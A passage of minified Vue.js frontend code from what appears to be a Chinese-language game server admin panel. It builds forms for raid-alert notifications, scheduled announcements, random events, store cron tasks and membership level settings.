160px))"},attrs:{min:0,placeholder:"大于0的数字",disabled:!e.edit},model:{value:t.radius,callback:function(i){e.$set(t,"radius",i)},expression:"HomeAttackedSquadConfig.radius"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("通知类型:")]),i("a-radio-group",{attrs:{disabled:!e.edit,"button-style":"solid"},on:{change:function(t){e.$set(e.settingsForm.HomeAttackedSquadConfigs[a],"emailConfigs",{host:"",port:"",secure:!0,user:"",pass:""}),e.$set(e.settingsForm.HomeAttackedSquadConfigs[a],"smsConfigs",{accessKeyId:"",accessKeySecret:"",signNameJson:"",templateCode:""})}},model:{value:t.type,callback:function(i){e.$set(t,"type",i)},expression:"HomeAttackedSquadConfig.type"}},[i("a-radio-button",{attrs:{value:"email"}},[e._v("电子邮箱")]),i("a-radio-button",{attrs:{value:"sms"}},[e._v("短信")])],1)],1),"email"===t.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("接收通知的邮箱列表:")]),i("a-select",{staticStyle:{width:"calc(100% - 160px)"},attrs:{mode:"tags",disabled:!e.edit},model:{value:t.tos,callback:function(i){e.$set(t,"tos",i)},expression:"HomeAttackedSquadConfig.tos"}})],1):e._e(),"sms"===t.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("接收通知的手机号列表:")]),i("a-select",{staticStyle:{width:"calc(100% - 160px)"},attrs:{mode:"tags",disabled:!e.edit},model:{value:t.phoneNumber,callback:function(i){e.$set(t,"phoneNumber",i)},expression:"HomeAttackedSquadConfig.phoneNumber"}})],1):e._e(),i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("启用专属通知设置:")]),i("a-switch",{attrs:{disabled:!e.edit},on:{change:function(t){e.$set(e.settingsForm.HomeAttackedSquadConfigs[a],"emailConfigs",{host:"",port:"",secure:!0,user:"",pass:""}),e.$set(e.settingsForm.HomeAttackedSquadConfigs[a],"smsConfigs",{accessKeyId:"",accessKeySecret:"",signNameJson:"",templateCode:""})}},model:{value:t.diy,callback:function(i){e.$set(t,"diy",i)},expression:"HomeAttackedSquadConfig.diy"}})],1),"email"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("邮箱服务器:")]),i("a-input",{staticStyle:{width:"calc((100% - 170px) / 2)"},attrs:{placeholder:"Host",disabled:!e.edit},model:{value:t.emailConfigs.host,callback:function(i){e.$set(t.emailConfigs,"host",i)},expression:"HomeAttackedSquadConfig.emailConfigs.host"}}),i("span",{staticStyle:{margin:"0 3px"}},[e._v(":")]),i("a-input",{staticStyle:{width:"calc((100% - 170px) / 2)"},attrs:{placeholder:"Port",disabled:!e.edit},model:{value:t.emailConfigs.port,callback:function(i){e.$set(t.emailConfigs,"port",i)},expression:"HomeAttackedSquadConfig.emailConfigs.port"}})],1):e._e(),"email"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("安全设置:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.emailConfigs.secure,callback:function(i){e.$set(t.emailConfigs,"secure",i)},expression:"HomeAttackedSquadConfig.emailConfigs.secure"}})],1):e._e(),"email"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("账号:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{placeholder:"发送邮件的邮箱地址",disabled:!e.edit},model:{value:t.emailConfigs.user,callback:function(i){e.$set(t.emailConfigs,"user",i)},expression:"HomeAttackedSquadConfig.emailConfigs.user"}})],1):e._e(),"email"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("密码:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{placeholder:"邮箱密码或者授权token",disabled:!e.edit},model:{value:t.emailConfigs.pass,callback:function(i){e.$set(t.emailConfigs,"pass",i)},expression:"HomeAttackedSquadConfig.emailConfigs.pass"}})],1):e._e(),"sms"===t.type&&t.diy?i("div",{staticStyle:{"line-height":"20px",color:"red"}},[e._v(" * 当前支持阿里云短信平台，请参考"),i("strong",[i("a",{attrs:{target:"_blank",href:"https://help.aliyun.com/zh/sms/getting-started/get-started-with-sms"}},[e._v("阿里云短信接入指南")])]),e._v("，配置短信模板时必须引入"),i("strong",[e._v("${action}")]),e._v("变量，例如："),i("strong",[e._v("XXX服务器玩家你好，当前有其他玩家在警戒范围内实施${action}行为，请上线查看")])]):e._e(),"sms"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("AccessKey ID:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{placeholder:"阿里云的AccessKey ID",disabled:!e.edit},model:{value:t.smsConfigs.accessKeyId,callback:function(i){e.$set(t.smsConfigs,"accessKeyId",i)},expression:"HomeAttackedSquadConfig.smsConfigs.accessKeyId"}})],1):e._e(),"sms"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("AccessKey Secret:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{placeholder:"阿里云的AccessKey Secret",disabled:!e.edit},model:{value:t.smsConfigs.accessKeySecret,callback:function(i){e.$set(t.smsConfigs,"accessKeySecret",i)},expression:"HomeAttackedSquadConfig.smsConfigs.accessKeySecret"}})],1):e._e(),"sms"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("短信签名名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{placeholder:"阿里云的短信签名名称",disabled:!e.edit},model:{value:t.smsConfigs.signNameJson,callback:function(i){e.$set(t.smsConfigs,"signNameJson",i)},expression:"HomeAttackedSquadConfig.smsConfigs.signNameJson"}})],1):e._e(),"sms"===t.type&&t.diy?i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("短信模板Code:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{placeholder:"短信模板Code",disabled:!e.edit},model:{value:t.smsConfigs.templateCode,callback:function(i){e.$set(t.smsConfigs,"templateCode",i)},expression:"HomeAttackedSquadConfig.smsConfigs.templateCode"}})],1):e._e()])})):e._e()],2),i("a-form-model-item",{attrs:{label:"启用游戏定时公告",prop:"EnableGameRoutineNotification"}},[i("a-switch",{attrs:{disabled:!e.edit},on:{change:function(t){t||(e.settingsForm.GameRoutineNotification=[])}},model:{value:e.settingsForm.EnableGameRoutineNotification,callback:function(t){e.$set(e.settingsForm,"EnableGameRoutineNotification",t)},expression:"settingsForm.EnableGameRoutineNotification"}})],1),i("a-form-model-item",{attrs:{label:"游戏定时公告",prop:"GameRoutineNotification"}},[i("a-row",[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(t){return e.settingsForm.GameRoutineNotification.push("")}}},[e._v("添加一行")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.GameRoutineNotification?"up":"down"},on:{click:function(){e.$set(e.expander,"GameRoutineNotification",!e.expander.GameRoutineNotification)}}},[e._v(e._s(e.expander.GameRoutineNotification?"隐藏":"显示"))])],1),e.expander.GameRoutineNotification?e._l(e.settingsForm.GameRoutineNotification,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%"}},[i("a-input",{staticStyle:{width:"calc(100% - 80px)"},attrs:{value:t,disabled:!e.edit,placeholder:"一行对应机器人的一条消息"},on:{change:function(t){e.settingsForm.GameRoutineNotification[a]=t.target.value}}}),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"minus"},on:{click:function(){return e.settingsForm.GameRoutineNotification.splice(a,1)}}},[e._v("删除")])],1)})):e._e()],2),i("a-form-model-item",{attrs:{label:"游戏公告时间间隔(分钟)",prop:"GameRoutineNotificationInterval"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.GameRoutineNotificationInterval,callback:function(t){e.$set(e.settingsForm,"GameRoutineNotificationInterval",t)},expression:"settingsForm.GameRoutineNotificationInterval"}})],1),i("a-form-model-item",{attrs:{label:"随机事件组",prop:"RandomEventList"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.RandomEventList.push({eventGroupName:"",eventList:[]})}}},[e._v("添加组")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.RandomEventList?"up":"down"},on:{click:function(){e.$set(e.expander,"RandomEventList",!e.expander.RandomEventList)}}},[e._v(e._s(e.expander.RandomEventList?"隐藏":"显示"))])],1),e.expander.RandomEventList?e._l(e.settingsForm.RandomEventList,(function(t,a){return i("div",{key:a,staticStyle:{width:"calc(100% - 10px)","min-width":"400px","margin-top":"10px","border-radius":"4px",border:"1px #aaaaaa dashed",padding:"10px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("组名:")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"250px"},attrs:{disabled:!e.edit,"allow-clear":""},model:{value:t.eventGroupName,callback:function(i){e.$set(t,"eventGroupName",i)},expression:"eventGroup.eventGroupName"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.RandomEventList.splice(a,1)}}},[e._v("移除组")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("事件列表:")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.eventList.push("")}}},[e._v("添加事件")])],1),e._l(t.eventList,(function(a,n){return i("div",{key:n,staticStyle:{width:"100%","margin-top":"10px","border-radius":"4px",border:"1px #aaaaaa dashed",padding:"0px 10px"}},[i("div",{staticStyle:{width:"100%"}},[i("strong",[e._v("事件"+e._s(n+1))]),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.eventList.splice(n,1)}}},[e._v("移除事件")])],1),i("div",{staticStyle:{width:"100%"}},[i("a-input",{attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"消息内容，每一条内容以回车换行隔开"},model:{value:t.eventList[n],callback:function(i){e.$set(t.eventList,n,i)},expression:"eventGroup.eventList[_index]"}})],1)])}))],2)})):e._e()],2),i("a-form-model-item",{attrs:{label:"商城和游戏定时任务",prop:"StoreCronSchedules"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.StoreCronSchedules.push({cron:{dayOfWeek:null,hour:null,minute:null},type:void 0,configs:{commands:"",UserCheckInPrize:null,OnlineRewardPerMinute:null}})}}},[e._v("添加")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.StoreCronSchedules?"up":"down"},on:{click:function(){e.$set(e.expander,"StoreCronSchedules",!e.expander.StoreCronSchedules)}}},[e._v(e._s(e.expander.StoreCronSchedules?"隐藏":"显示"))])],1),e.expander.StoreCronSchedules?e._l(e.settingsForm.StoreCronSchedules,(function(t,a){return i("div",{key:a,staticStyle:{width:"calc(100% - 10px)","min-width":"500px","margin-top":"10px","border-radius":"4px",border:"1px #aaaaaa dashed",padding:"10px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("每周")]),i("a-select",{staticStyle:{"margin-left":"5px",width:"100px"},attrs:{disabled:!e.edit,"allow-clear":""},model:{value:t.cron.dayOfWeek,callback:function(i){e.$set(t.cron,"dayOfWeek",i)},expression:"StoreCronSchedule.cron.dayOfWeek"}},[i("a-select-option",{key:1,attrs:{label:"一"}},[e._v("一")]),i("a-select-option",{key:2,attrs:{label:"二"}},[e._v("二")]),i("a-select-option",{key:3,attrs:{label:"三"}},[e._v("三")]),i("a-select-option",{key:4,attrs:{label:"四"}},[e._v("四")]),i("a-select-option",{key:5,attrs:{label:"五"}},[e._v("五")]),i("a-select-option",{key:6,attrs:{label:"六"}},[e._v("六")]),i("a-select-option",{key:0,attrs:{label:"日"}},[e._v("日")])],1),i("a-select",{staticStyle:{"margin-left":"10px",width:"100px"},attrs:{disabled:!e.edit,"allow-clear":""},model:{value:t.cron.hour,callback:function(i){e.$set(t.cron,"hour",i)},expression:"StoreCronSchedule.cron.hour"}},e._l(24,(function(t){return i("a-select-option",{key:t-1,attrs:{label:t-1}},[e._v(e._s(t-1))])})),1),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("时")]),i("a-select",{staticStyle:{"margin-left":"10px",width:"100px"},attrs:{disabled:!e.edit,"allow-clear":""},model:{value:t.cron.minute,callback:function(i){e.$set(t.cron,"minute",i)},expression:"StoreCronSchedule.cron.minute"}},e._l(60,(function(t){return i("a-select-option",{key:t-1,attrs:{label:t-1}},[e._v(e._s(t-1))])})),1),i("span",{staticStyle:{"margin-left":"5px"},attrs:{"allow-clear":""}},[e._v("分")]),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.StoreCronSchedules.splice(a,1)}}},[e._v("移除")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("动作:")]),i("a-select",{staticStyle:{"margin-left":"10px",width:"calc(100% - 42px)"},attrs:{disabled:!e.edit,placeholder:"请选择动作类型"},on:{change:function(i){return e.$set(t,"configs",{commands:"",eventGroupName:"",UserCheckInPrize:null,OnlineRewardPerMinute:null})}},model:{value:t.type,callback:function(i){e.$set(t,"type",i)},expression:"StoreCronSchedule.type"}},[i("a-select-option",{key:"message",attrs:{label:"游戏消息"}},[e._v("游戏消息")]),i("a-select-option",{key:"randomEvent",attrs:{label:"随机事件"}},[e._v("随机事件")]),i("a-select-option",{key:"changeUserCheckInPrize",attrs:{label:"修改签到奖励"}},[e._v("修改签到奖励")]),i("a-select-option",{key:"changeOnlineRewardPerMinute",attrs:{label:"修改在线奖励"}},[e._v("修改在线奖励")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},["message"===t.type?[i("a-input",{attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"消息内容，每一条内容以回车换行隔开"},model:{value:t.configs.commands,callback:function(i){e.$set(t.configs,"commands",i)},expression:"StoreCronSchedule.configs.commands"}})]:e._e(),"randomEvent"===t.type?[i("span",[e._v("事件组:")]),i("a-select",{staticStyle:{"margin-left":"10px",width:"calc(100% - 56px)"},attrs:{disabled:!e.edit,placeholder:"请选择随机事件组"},model:{value:t.configs.eventGroupName,callback:function(i){e.$set(t.configs,"eventGroupName",i)},expression:"StoreCronSchedule.configs.eventGroupName"}},e._l(e.existRandomEventList,(function(t){return i("a-select-option",{key:t.eventGroupName,attrs:{label:t.eventGroupName}},[e._v(" "+e._s(t.eventGroupName))])})),1)]:e._e(),"changeUserCheckInPrize"===t.type?[i("span",[e._v("签到奖励:")]),i("a-input-number",{staticStyle:{"margin-left":"10px",width:"150px"},attrs:{type:"textarea",disabled:!e.edit,min:0,placeholder:"请输入签到奖励"},model:{value:t.configs.UserCheckInPrize,callback:function(i){e.$set(t.configs,"UserCheckInPrize",i)},expression:"StoreCronSchedule.configs.UserCheckInPrize"}})]:e._e(),"changeOnlineRewardPerMinute"===t.type?[i("span",[e._v("签到奖励:")]),i("a-input-number",{staticStyle:{"margin-left":"10px",width:"150px"},attrs:{type:"textarea",disabled:!e.edit,min:0,placeholder:"请输入在线奖励"},model:{value:t.configs.OnlineRewardPerMinute,callback:function(i){e.$set(t.configs,"OnlineRewardPerMinute",i)},expression:"StoreCronSchedule.configs.OnlineRewardPerMinute"}})]:e._e()],2)])})):e._e()],2)],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"261927f6",null).exports),Oa={name:"LevelSettings",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{show:!1,loading:!1,columns:[{title:"等级",key:"level",dataIndex:"level",width:80,align:"center",scopedSlots:{customRender:"level"}},{title:"需要等级积分",key:"chargeDollars",dataIndex:"chargeDollars",width:110,align:"center",scopedSlots:{customRender:"chargeDollars"}},{title:"折扣",key:"discount",dataIndex:"discount",width:100,align:"center",scopedSlots:{customRender:"discount"}},{title:"启用会员称呼",key:"enableGesture",dataIndex:"enableGesture",width:110,align:"center",scopedSlots:{customRender:"enableGesture"}},{title:"统一称号",key:"generalGesture",dataIndex:"generalGesture",width:110,align:"center",scopedSlots:{customRender:"generalGesture"}},{title:"签到奖励",key:"checkInPrize",dataIndex:"checkInPrize",width:110,align:"center",scopedSlots:{customRender:"checkInPrize"}},{title:"登录时长奖励",key:"onlinePrize",dataIndex:"onlinePrize",width:110,align:"center",scopedSlots:{customRender:"onlinePrize"}},{title:"在线奖励起算时间",key:"minRewardOnlineTime",dataIndex:"minRewardOnlineTime",width:110,align:"center",scopedSlots:{customRender:"minRewardOnlineTime"}},{title:"每日在线奖励上限",key:"maxOnlineReward",dataIndex:"maxOnlineReward",width:110,align:"center",scopedSlots:{customRender:"maxOnlineReward"}},{title:"是否在播报的时候加上等级",key:"enableLevelAnnounce",dataIndex:"enableLevelAnnounce",width:110,align:"center",scopedSlots:{customRender:"enableLevelAnnounce"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",fix:"right",scopedSlots:{customRender:"controls"}}],list:[],showAdd2EditModal:!1,mode:"add",restricted:!1,settingsForm:{id:-1,level:null,chargeDollars:null,discount:null,enableGesture:null,generalGesture:null,checkInPrize:null,onlinePrize:null,minRewardOnlineTime:null,maxOnlineReward:null,enableLevelAnnounce:!0},saveLoading:!1,settingsFormRules:{level:[{required:!0,trigger:"change",message:"请输入等级(整数)",validator:function(e,t,i){"number"==typeof t&&t>=0&&parseInt(t)===t?i():i(new Error("请输入等级(整数)"))}}],chargeDollars:[{required:!0,trigger:"change",message:"请输入",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入"))}}],discount:[{required:!0,trigger:"change",message:"请输入折扣(0 - 100, 整数)",validator:function(e,t,i){"number"==typeof t&&t>=0&&t<=100&&parseInt(t)===t?i():i(new Error("请输入折扣(0 - 100, 整数)"))}}],enableGesture:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],checkInPrize:[{trigger:"change",message:"请输入签到奖励(>=0)",validator:function(e,t,i){"number"==typeof t&&t>=0||null===t?i():i(new Error("请输入签到奖励(>=0)"))}}],onlinePrize:[{trigger:"change",message:"请输入登录时长奖励(>=0)",validator:function(e,t,i){"number"==typeof t&&t>=0||null===t?i():i(new Error("请输入登录时长奖励(>=0)"))}}],minRewardOnlineTime:[{trigger:"change",message:"在线奖励起算时间(>=0)",validator:function(e,t,i){"number"==typeof t&&t>=0||null===t?i():i(new Error("在线奖励起算时间(>=0)"))}}],maxOnlineReward:[{trigger:"change",message:"每日在线奖励上限制(>=0)",validator:function(e,t,i){"number"==typeof t&&t>=0||null===t?i():i(new Error("每日在线奖励上限制(>=0)"))}}],enableLevelAnnounce:[{trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}]}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getData();case 2:case"end":return t.stop()}}),t)})))()},methods:{getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/levelAdminSys/list",params:{pageNum:1,pageSize:99999}});case 4:i=t.sent,e.loading=!1,200===i.status&&(e.list=i.data.list),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onClickClose:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.showAdd2EditModal=!1,e.mode="add",e.restricted=!1,e.settingsForm={id:-1,level:null,chargeDollars:null,discount:null,enableGesture:null,generalGesture:null,checkInPrize:null,onlinePrize:null,minRewardOnlineTime:null,maxOnlineReward:null};case 4:case"end":return t.stop()}}),t)})))()},onClickDelete:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,i.next=3,f({method:"DELETE",url:"/levelAdminSys/delete",params:{id:e.id}});case 3:if(200!==i.sent.status){i.next=8;break}return t.$message.success("操作成功"),i.next=8,t.getData();case 8:i.next=13;break;case 10:i.prev=10,i.t0=i.catch(0),console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[0,10]])})))()},onClickAdd:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.showAdd2EditModal=!0,e.mode="add",e.restricted=!1,e.settingsForm={id:-1,level:null,chargeDollars:null,discount:null,enableGesture:null,generalGesture:null,checkInPrize:null,onlinePrize:null,minRewardOnlineTime:null,maxOnlineReward:null,enableLevelAnnounce:!0};case 4:case"end":return t.stop()}}),t)})))()},onClickEdit:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:t.showAdd2EditModal=!0,t.mode="edit",t.restricted=!(t.userInfo&&("sysAdmin"===t.userInfo.role||"admin"===t.userInfo.role)&&0!==e.level),t.settingsForm={id:e.id,level:e.level,chargeDollars:e.chargeDollars,discount:Number((100*e.discount).toFixed(0)),enableGesture:e.enableGesture,generalGesture:e.generalGesture,checkInPrize:e.checkInPrize,onlinePrize:e.onlinePrize,minRewardOnlineTime:e.minRewardOnlineTime,maxOnlineReward:e.maxOnlineReward,enableLevelAnnounce:e.enableLevelAnnounce};case 4:case"end":return i.stop()}}),i)})))()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=24;break}return(a=Object(A.cloneDeep)(e.settingsForm)).discount=a.discount/100,console.log(a),e.saveLoading=!0,t.prev=5,t.next=8,f({method:"add"===e.mode?"POST":"PUT",url:"add"===e.mode?"/levelAdminSys/add":e.restricted?"/levelAdminSys/updateInfo":"/levelAdminSys/update",data:a});case 8:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=18;break}return e.$message.success("add"===e.mode?"新增成功":"修改成功"),e.showAdd2EditModal=!1,e.mode="add",e.restricted=!1,e.settingsForm={id:-1,level:null,chargeDollars:null,discount:null,enableGesture:null,generalGesture:null,checkInPrize:null,onlinePrize:null,minRewardOnlineTime:null,maxOnlineReward:null,enableLevelAnnounce:!0},t.next=18,e.getData();case 18:t.next=24;break;case 20:t.prev=20,t.t0=t.catch(5),console.error(t.t0),e.saveLoading=!1;case 24:case"end":return t.stop()}}),t,null,[[5,20]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()}}},qa=(i("b3bb"),Object(S.a)(Oa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("会员等级设置")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")])],1),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%","min-height":"350px",position:"relative",background:"white","overflow-y":"auto"}},[e.loading?e._e():i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[i("a-row",{staticStyle:{height:"32px","line-height":"32px",width:"100%"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{attrs:{size:"small",type:"primary",icon:"plus"},on:{click:e.onClickAdd}},[e._v("添加")])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.columns,"data-source":e.list,"row-key":"id",pagination:!1,bordered:"",scroll:{x:"100%",y:"320"},size:"small"},scopedSlots:e._u([{key:"level",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"chargeDollars",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"discount",fn:function(t){return[i("span",[e._v(e._s((100*t).toFixed(0))+"%")])]}},{key:"enableGesture",fn:function(t){return[i("span",[e._v(e._s(t?"是":"否"))])]}},{key:"generalGesture",fn:function(t){return[i("span",[e._v(e._s(null!=t&&t.length?t:"-"))])]}},{key:"checkInPrize",fn:function(t){return[i("span",[e._v(e._s(null!=t?t:"-"))])]}},{key:"onlinePrize",fn:function(t){return[i("span",[e._v(e._s(null!=t?t:"-"))])]}},{key:"minRewardOnlineTime",fn:function(t){return[i("span",[e._v(e._s(null!=t?t:"-"))])]}},{key:"maxOnlineReward",fn:function(t){return[i("span",[e._v(e._s(null!=t?t:"-"))])]}},{key:"enableLevelAnnounce",fn:function(t){return[i("span",[e._v(e._s(!0===t?"是":"否"))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():[i("a-button",{attrs:{icon:"edit",size:"small"},on:{click:function(){e.onClickEdit(a)}}},[e._v("修改")]),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除等级吗"},on:{confirm:function(){return e.onClickDelete(a)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",icon:"delete",size:"small",disabled:!(e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role))||0===a.level}},[e._v("删除")])],1)]]}}],null,!1,1591663909)}),i("a-modal",{attrs:{title:("add"===e.mode?"新增":"编辑")+"会员等级","mask-closable":!1,width:500},on:{cancel:e.onClickClose},model:{value:e.showAdd2EditModal,callback:function(t){e.showAdd2EditModal=t},expression:"showAdd2EditModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("提交")])],1),e.showAdd2EditModal?i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"500px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:9},"wrapper-col":{span:15}}},[i("a-form-model-item",{attrs:{label:"等级",prop:"level"}},[i("a-input-number",{attrs:{disabled:e.restricted,min:0},model:{value:e.settingsForm.level,callback:function(t){e.$set(e.settingsForm,"level",t)},expression:"settingsForm.level"}})],1),i("a-form-model-item",{attrs:{label:"需要等级积分",prop:"chargeDollars"}},[i("a-input-number",{attrs:{min:0},model:{value:e.settingsForm.chargeDollars,callback:function(t){e.$set(e.settingsForm,"chargeDollars",t)},expression:"settingsForm.chargeDollars"}})],1),i("a-form-model-item",{attrs:{label:"折扣(%)",prop:"discount"}},[i("a-input-number",{attrs:{min:0,max:100},model:{value:e.settingsForm.discount,callback:function(t){e.$set(e.settingsForm,"discount",t)},expression:"settingsForm.discount"}})],1),i("a-form-model-item",{attrs:{label:"启用会员称呼",prop:"enableGesture"}},[i("a-switch",{model:{value:e.settingsForm.enableGesture,callback:function(t){e.$set(e.settingsForm,"enableGesture",t)},expression:"settingsForm.enableGesture"}})],1),i("a-form-model-item",{attrs:{label:"统一称号",prop:"generalGesture"}},[i("a-input",{model:{value:e.settingsForm.generalGesture,callback:function(t){e.$set(e.settingsForm,"generalGesture",t)},expression:"settingsForm.generalGesture"}})],1),i("a-form-model-item",{attrs:{label:"商城每日签到奖励",prop:"checkInPrize"}},[i("a-input-number",{attrs:{min:0},model:{value:e.settingsForm.checkInPrize,callback:function(t){e.$set(e.settingsForm,"checkInPrize",t)},expression:"settingsForm.checkInPrize"}}),i("a-button",{staticStyle:{"margin-left":"5px"},attrs:{size:"small"},on:{click:function(t){e.settingsForm.checkInPrize=null}}},[e._v("置空")])],1),i("a-form-model-item",{attrs:{label:"在线奖励(每分钟)",prop:"onlinePrize"}},[i("a-input-number",{attrs:{min:0},model:{value:e.settingsForm.onlinePrize,callback:function(t){e.$set(e.settingsForm,"onlinePrize",t)},expression:"settingsF